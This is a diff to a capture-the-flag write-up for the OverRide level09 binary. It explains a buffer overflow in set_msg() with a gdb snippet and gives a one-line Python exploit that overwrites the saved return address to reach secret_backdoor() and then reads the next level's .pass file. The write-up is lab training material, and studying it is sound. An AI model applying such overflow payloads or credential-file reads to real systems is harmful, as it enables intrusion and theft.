@@ -21,6 +21,17 @@ The program contains `secret_backdoor()` function which reads in at most 127 cha
 
 At first glance, return address must be overwritten in order to redirect flow of the program into `secret_backdoor()` function.
 
+The function `set_msg()` calls `fgets` which reads 1024 bytes into the buffer of 128 bytes.
+
+Then it copy at most len characters `buffer+180`, from source `str` into destination `buffer`.
+```gdb
+   0x5555555549a2 <set_msg+112>:	mov    rax,QWORD PTR [rbp-0x408]
+=> 0x5555555549a9 <set_msg+119>:	mov    eax,DWORD PTR [rax+0xb4]
+   0x5555555549af <set_msg+125>:	movsxd rdx,ea
+```
+The value of message length, `buffer+180` can be overwirtten using `username`.
+With a large message there is possibility to overwrite saved RIP of `handle_msg()`
+
 # Exploit
 ```sh
 level09@OverRide:~$ (python -c "import struct; print('\xff'*50 + '\n' + '\x55'*200 + struct.pack('Q', 0x55555555488c))"; echo 'cat /home/users/$(whoami)/.pass') | ./level09
